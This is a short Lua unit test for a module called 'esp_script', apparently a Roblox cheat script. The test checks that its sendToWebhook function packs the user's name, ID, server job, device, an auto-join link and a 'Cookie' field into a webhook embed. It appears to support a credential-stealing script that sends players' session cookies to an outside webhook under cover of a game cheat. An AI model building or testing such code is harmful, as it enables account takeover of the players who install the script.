local busted = require('busted')

-- indicate test mode
_G._TEST = true

-- minimal stubs
local captured
local requestStub = function(opts)
    captured = opts.Body
end
_G.request = requestStub
_G.game = {
    GetService = function(_, name)
        if name == "HttpService" then
            return { JSONEncode = function(_, t) return t end }
        end
    end
}

local esp = require("esp_script")

describe("sendToWebhook", function()
    it("uses provided AutoJoinLink", function()
        local data = {
            Username = "Tester",
            UserId = 1,
            PlaceId = 2,
            JobId = "job",
            ProfileLink = "link",
            Cookie = "cookie",
            Device = "PC",
            AutoJoinLink = "roblox://placeId=2&gameInstanceId=job"
        }
        esp.sendToWebhook(data)
        local fields = captured.embeds[1].fields
        local link
        for _, f in ipairs(fields) do
            if f.name == "Auto-Join Link" then
                link = f.value
            end
        end
        assert.is_truthy(link:find(data.AutoJoinLink, 1, true))
    end)
end)
